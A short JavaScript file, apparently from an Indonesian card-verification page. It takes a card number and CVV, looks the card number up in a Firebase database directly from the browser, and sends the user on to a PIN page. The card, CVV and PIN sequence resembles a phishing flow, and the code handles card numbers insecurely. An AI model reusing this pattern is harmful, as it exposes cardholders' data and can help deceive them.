import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getDatabase, ref, get, child } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyDXYDqFmhO8nacuX-hVnNsXMmpeqwYlW7U",
    authDomain: "wifist-d3588.firebaseapp.com",
    databaseURL: "https://wifist-d3588-default-rtdb.asia-southeast1.firebasedatabase.app/", 
    projectId: "wifist-d3588"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

document.getElementById('btnVerify').onclick = async () => {
    const cardInput = document.getElementById('cardNo').value;
    const cvvInput = document.getElementById('cvv').value;
    const btn = document.getElementById('btnVerify');

    if (cardInput.length < 16 || cvvInput.length < 3) {
        alert("Harap lengkapi detail kartu!");
        return;
    }

    btn.innerText = "MENGECEK...";
    btn.disabled = true;

    try {
        const dbRef = ref(db);
        const snapshot = await get(child(dbRef, `nasabah/${cardInput}`));

        if (snapshot.exists()) {
            // Data ditemukan, simpan sementara ke sessionStorage
            sessionStorage.setItem('pending_card', cardInput);
            
            // Lanjut ke halaman PIN
            window.location.href = 'pin.html';
        } else {
            alert("Nomor Kartu tidak terdaftar atau Salah!");
            btn.innerText = "LANJUTKAN KE PIN";
            btn.disabled = false;
        }
    } catch (e) {
        console.error(e);
        alert("Gangguan Koneksi!");
        btn.disabled = false;
    }
};
